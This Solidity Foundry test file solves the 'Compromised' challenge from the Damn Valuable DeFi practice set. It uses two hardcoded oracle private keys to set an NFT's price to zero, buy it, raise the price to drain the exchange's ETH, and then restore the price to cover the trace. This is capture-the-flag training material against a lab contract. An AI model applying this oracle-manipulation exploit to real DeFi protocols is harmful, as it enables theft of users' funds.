// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
import {Exchange} from "../../../src/Contracts/compromised/Exchange.sol";
import {TrustfulOracle} from "../../../src/Contracts/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../../src/Contracts/compromised/TrustfulOracleInitializer.sol";

contract Compromised is Test {
    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 9990e18;
    uint256 constant INITIAL_NFT_PRICE = 999e18;

    Exchange exchange;
    DamnValuableNFT nft;
    TrustfulOracle trustfulOracle;
    address payable attacker;

    function setUp() public {
        address[] memory sources = new address[](3);

        sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
        sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
        sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.deal(attacker, 0.1 ether);
        vm.label(attacker, "Attacker");
        assertEq(attacker.balance, 0.1 ether);

        // Initialize balance of the trusted source addresses
        uint256 arrLen = sources.length;
        for (uint256 i; i < arrLen; ++i) {
            vm.deal(sources[i], 2 ether);
            assertEq(sources[i].balance, 2 ether);
        }

        string[] memory symbols = new string[](3);
        for (uint256 i; i < arrLen; ++i) {
            symbols[i] = "DVNFT";
        }

        uint256[] memory initialPrices = new uint256[](3);
        for (uint256 i; i < arrLen; ++i) {
            initialPrices[i] = INITIAL_NFT_PRICE;
        }

        // Deploy the oracle and setup the trusted sources with initial prices
        trustfulOracle = new TrustfulOracleInitializer(
            sources,
            symbols,
            initialPrices
        ).oracle();

        // Deploy the exchange and get the associated ERC721 token
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
            address(trustfulOracle)
        );
        vm.label(address(exchange), "Exchange");
        nft = exchange.token();
    }

    function testExploit() public {
        address exploitedOracle1 = vm.addr(
            0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
        );
        address exploitedOracle2 = vm.addr(
            0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
        );

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(attacker);
        exchange.buyOne{value: 0.1 ether}();

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        vm.startPrank(attacker);
        nft.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();

        vm.prank(address(exploitedOracle1));
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(address(exploitedOracle2));
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        validation();
    }

    function validation() public {
        // Exchange must have lost all ETH
        assertEq(address(exchange).balance, 0);

        // Attacker's ETH balance must have significantly increased
        assertGt(attacker.balance, EXCHANGE_INITIAL_ETH_BALANCE);

        // Attacker must not own any NFT
        assertEq(nft.balanceOf(attacker), 0);

        // NFT price shouldn't have changed
        assertEq(trustfulOracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
